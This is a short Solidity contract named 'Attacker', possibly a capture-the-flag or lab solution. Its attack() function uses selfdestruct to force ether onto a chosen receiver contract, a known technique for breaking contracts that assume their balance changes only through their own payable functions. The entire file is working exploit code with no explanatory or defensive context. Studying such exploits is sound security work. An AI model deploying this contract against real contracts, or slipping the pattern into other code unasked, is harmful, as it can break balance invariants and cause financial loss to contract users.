pragma solidity 0.8.13;


contract Attacker {
    address receiver;

    receive() external payable {
    }

    constructor(address _receiver) {
        receiver = _receiver;
    }

    function attack() public payable {
        // cast address to payable
        address payable addr = payable(address(receiver));
        selfdestruct(addr);
    }
}